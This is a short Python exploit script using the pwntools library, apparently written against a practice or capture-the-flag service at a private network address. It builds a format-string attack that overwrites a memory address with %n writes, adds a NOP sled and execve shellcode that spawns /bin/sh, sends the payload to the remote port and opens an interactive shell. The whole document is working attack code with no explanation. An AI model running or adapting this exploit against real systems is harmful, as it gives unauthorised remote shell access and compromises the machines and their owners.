from pwn import *

tar_p1 = p32(0x080496d8)
tar_p2 = p32(0x080496d8 + 0x2)

buf = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69'
buf += '\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

payload = tar_p1 + tar_p2

# 0xbffff630

payload += '%62952d' + '%12$n'
payload += '%51727d' + '%13$n'

payload += nop + buf

r = remote('192.168.122.87', 4444)
r.sendline(payload)

r.interactive()
